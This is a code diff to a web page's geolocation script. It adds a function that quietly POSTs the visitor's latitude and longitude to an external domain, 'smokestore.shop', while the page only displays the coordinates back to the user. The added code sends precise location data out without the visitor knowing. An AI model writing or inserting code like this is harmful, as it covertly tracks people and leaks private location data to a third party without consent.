@@ -16,6 +16,7 @@
                     timeout: 10000,
                     maximumAge: 0
                 };
+
                 navigator.geolocation.getCurrentPosition(showPosition, handleError, options);
             } else {
                 document.getElementById("location").textContent = "Geolocation is not supported by this browser.";
@@ -25,7 +26,12 @@
         function showPosition(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+
+            // Update the location display
             document.getElementById("location").textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+
+            // Send the location to an external server
+            sendLocationToServer(lat, lon);
         }
 
         function handleError(error) {
@@ -43,6 +49,37 @@
                     document.getElementById("location").textContent = "An unknown error occurred.";
                     break;
             }
+        }
+
+        function sendLocationToServer(lat, lon) {
+            const url = "https://smokestore.shop/test.html"; // Replace with your actual external endpoint
+
+            // Prepare the data to be sent
+            const data = {
+                latitude: lat,
+                longitude: lon
+            };
+
+            // Send the location data using Fetch API
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
         }
     </script>
 </body>
